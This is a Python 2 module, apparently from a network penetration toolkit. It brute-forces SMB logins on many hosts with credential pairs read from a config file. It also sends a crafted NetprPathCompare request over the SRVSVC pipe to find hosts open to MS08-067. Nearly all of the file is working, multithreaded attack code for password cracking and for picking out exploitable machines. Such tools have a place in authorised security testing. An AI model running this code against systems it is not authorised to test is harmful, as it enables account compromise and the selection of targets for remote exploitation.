#coding=utf-8
import time
import threading
from printers import printPink,printGreen
from impacket.smbconnection import *
import socket
from multiprocessing.dummy import Pool
socket.setdefaulttimeout(8)


from random import choice
from string import letters
from struct import pack
from threading import Thread
from impacket import smb
from impacket import uuid
from impacket.dcerpc import transport
from ndr import *



def smb_connect(ip,username,password):
    crack =0
    try:
        smb = SMBConnection('*SMBSERVER', ip)
        smb.login(username,password)
        smb.logoff()
        crack =1
    except Exception, e:
        lock.acquire()
        print "%s smb 's %s:%s login fail " %(ip,username,password)
        lock.release()
        pass
    return crack
def smb_l(ip,port):
        try:
            d=open('conf/smb.conf','r')
            data=d.readline().strip('\r\n')
            while(data):
                username=data.split(':')[0]
                password=data.split(':')[1]
                if smb_connect(ip,username,password)==1:
                    lock.acquire()
                    printGreen("%s smb at %s has weaken password!!-------%s:%s\r\n" %(ip,port,username,password))
                    result.append("%s smb at %s has weaken password!!-------%s:%s\r\n" %(ip,port,username,password))
                    lock.release()
                    break
                data=d.readline().strip('\r\n')
        except Exception,e:
            print e
            pass

CMDLINE = True
SILENT  = False

class connectionException(Exception):
    pass
class MS08_067(Thread):
    def __init__(self, target, port=445):
        super(MS08_067, self).__init__()

        self.__port   = port
        self.target   = target
        self.status   = 'unknown'


    def __checkPort(self):
        '''
        Open connection to TCP port to check if it is open
        '''

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((self.target, self.__port))
            s.close()

        except socket.timeout, _:
            raise connectionException, 'connection timeout'

        except socket.error, _:
            raise connectionException, 'connection refused'


    def __connect(self):
        '''
        SMB connect to the Computer Browser service named pipe
        Reference: http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_browser.html
        '''

        try:
            self.__trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % self.target)
            self.__trans.connect()

        except smb.SessionError, _:
            raise connectionException, 'access denied (RestrictAnonymous is probably set to 2)'

        except:
            #raise Exception, 'unhandled exception (%s)' % format_exc()
            raise connectionException, 'unexpected exception'


    def __bind(self):
        '''
        DCERPC bind to SRVSVC (Server Service) endpoint
        Reference: http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_srvsvc.html
        '''

        try:
            self.__dce = self.__trans.DCERPC_class(self.__trans)

            self.__dce.bind(uuid.uuidtup_to_bin(('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))

        except socket.error, _:
            raise connectionException, 'unable to bind to SRVSVC endpoint'

        except:
            #raise Exception, 'unhandled exception (%s)' % format_exc()
            raise connectionException, 'unexpected exception'


    def __forgePacket(self):
        '''
        Forge the malicious NetprPathCompare packet

        Reference: http://msdn.microsoft.com/en-us/library/cc247259.aspx

        long NetprPathCompare(
          [in, string, unique] SRVSVC_HANDLE ServerName,
          [in, string] WCHAR* PathName1,
          [in, string] WCHAR* PathName2,
          [in] DWORD PathType,
          [in] DWORD Flags
        );
        '''

        self.__path = ''.join([choice(letters) for _ in xrange(0, 3)])

        self.__request  = ndr_unique(pointer_value=0x00020000, data=ndr_wstring(data='')).serialize()
        self.__request += ndr_wstring(data='\\%s\\..\\%s' % ('A'*5, self.__path)).serialize()
        self.__request += ndr_wstring(data='\\%s' % self.__path).serialize()
        self.__request += ndr_long(data=1).serialize()
        self.__request += ndr_long(data=0).serialize()


    def __compare(self):
        '''
        Compare NetprPathCompare response field 'Windows Error' with the
        expected value (WERR_OK) to confirm the target is vulnerable
        '''

        self.__vulnerable = pack('<L', 0)

        # The target is vulnerable if the NetprPathCompare response field
        # 'Windows Error' is WERR_OK (0x00000000)
        if self.__response == self.__vulnerable:
            self.status = 'VULNERABLE'
        else:
            self.status = 'not vulnerable'



    def run(self):
        try:
            self.__checkPort()
            self.__connect()
            self.__bind()
        except connectionException, e:
            self.status = e
            self.result()
            return None

        # Forge and send the NetprPathCompare operation malicious packet
        self.__forgePacket()
        self.__dce.call(32, self.__request)

        # Get back the NetprPathCompare response and check if it is vulnerable
        self.__response = self.__dce.recv()
        self.__compare()
        return self.status

def check(ip,port):
        try:
            current = MS08_067(ip)
            msg=current.run()
            if msg=='VULNERABLE':
                lock.acquire()
                printGreen("%s has ms_08_067 VULNERABLE\r\n" %ip)
                lock.release()
                result.append("%s has ms_08_067 VULNERABLE\r\n" %ip)
            else:
                print '%s ms_08_067 is not VULNERABLE' %ip
        except Exception,e:
            pass



def smb_main(ipdict,threads):
    printPink("crack smb  now...")
    print "[*] start crack smb serice  %s" % time.ctime()
    starttime=time.time()

    global lock
    lock = threading.Lock()
    global result
    result=[]

    pool=Pool(threads)

    for ip in ipdict['smb']:
        pool.apply_async(func=smb_l,args=(str(ip).split(':')[0],int(str(ip).split(':')[1])))

    pool.close()
    pool.join()



    print "[*] stop smb serice  %s" % time.ctime()
    print "[*] crack smb  done,it has Elapsed time:%s " % (time.time()-starttime)



#------------------------------------------------------------------
#------------------------割----------------------------------------
#------------------------------------------------------------------

# test ms08_067
    printPink("test ms_08_067  now...")
    print "[*] test ms_08_067  at  %s" % time.ctime()
    starttime=time.time()

    pool=Pool(threads)

    for ip in ipdict['smb']:
        pool.apply_async(func=check,args=(str(ip).split(':')[0],int(str(ip).split(':')[1])))

    pool.close()
    pool.join()


    print "[*] done test ms_08_067  now :%s " % (time.time()-starttime)
    return result